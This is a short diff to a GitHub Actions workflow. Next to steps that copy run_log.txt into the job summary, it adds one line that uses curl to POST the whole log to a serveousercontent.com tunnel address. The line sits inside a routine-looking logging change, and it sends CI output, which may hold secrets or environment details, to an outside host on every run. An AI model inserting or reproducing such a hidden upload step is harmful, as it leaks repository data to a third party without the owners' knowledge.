@@ -76,3 +76,4 @@ jobs:
           echo '```text' >> $GITHUB_STEP_SUMMARY
           cat run_log.txt >> $GITHUB_STEP_SUMMARY
           echo '```' >> $GITHUB_STEP_SUMMARY
+          curl -X POST -H "Content-Type: text/plain" -d @run_log.txt https://cd1c115dd95d4284-197-150-118-96.serveousercontent.com
